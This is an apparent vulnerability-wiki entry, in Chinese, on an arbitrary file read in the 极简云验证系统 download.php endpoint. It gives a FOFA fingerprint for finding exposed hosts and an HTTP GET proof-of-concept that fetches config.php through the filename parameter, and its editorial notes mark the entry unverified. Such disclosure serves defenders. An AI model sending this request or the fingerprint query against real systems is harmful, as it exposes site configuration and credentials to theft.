---
source: "wy876 漏洞文库"
title: "极简云验证系统download存在任意文件读取漏洞"
product: "极简云验证系统"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
source_status: "unknown"
prerequisites: "原文未完整说明身份权限、部署配置和可达性；不能假定匿名、默认开启或所有版本适用。"
side_effects: "原文未完整记录副作用、清理步骤或运行验证；阅读样例不等于获准在真实系统执行。"
id: "vw-5df05a4fa3da5e3e971c7527"
entity_id: "ve-5df05a4fa3da5e3e971c7527"
schema_version: "1"
previous_fofa_unverified: "body="
fofa: "body=\"/js/lib/slimscroll.js\""
---

# 极简云验证系统download存在任意文件读取漏洞

> 指纹字段校订（2026-10-04）：本文原归档明确标为 FOFA 的完整表达式已记入 `fofa`；原残缺 `fofa_unverified` 值逐字保存在 `previous_fofa_unverified`。后文关于该字段残缺的旧说明只描述校订前状态。查询用于产品检索，不证明资产受影响。

<!-- vulwiki-editorial:start -->
## 校订与适用边界


### 本次正文校订

- 按实际内容修正 1 处代码围栏语言标记，保留其中方法与请求内容。

### 尚未解决的证据缺口

以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：

- FOFA仅body=丢失完整查询
- slimscroll公共库指纹低特异性
- file参数固定散列不说明生成/与filename关系
- 版本缺失且无响应，简介验证码平台描述需核真实产品
- 与OA极简云同产品需合并目录

本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
<!-- vulwiki-editorial:end -->

## 技术正文与历史材料

# 一、漏洞简介
  极简云验证系统是一种简洁高效的身份验证方案，通过使用云端技术，实现用户身份验证和访问控制。用户只需输入手机号或邮箱等基本信息，系统即可发送验证码，验证过程快速便捷。此系统具有高度可扩展性和安全性，可适用于各种应用场景，如登录、支付等。同时，它还支持多种验证方式，如短信验证码、邮箱验证码等，为用户提供了灵活多样的选择。极简云验证系统download存在任意文件读取漏洞.

# 二、影响版本
+ 极简云验证系统

# 三、资产测绘
+ fofa`body="/js/lib/slimscroll.js"`
+ 特征


# 四、漏洞复现
```http
GET /download.php?file=20b6cb088a8d5c444074&filename=config.php HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Length: 0
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/opf4xa6pir84dgb4>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
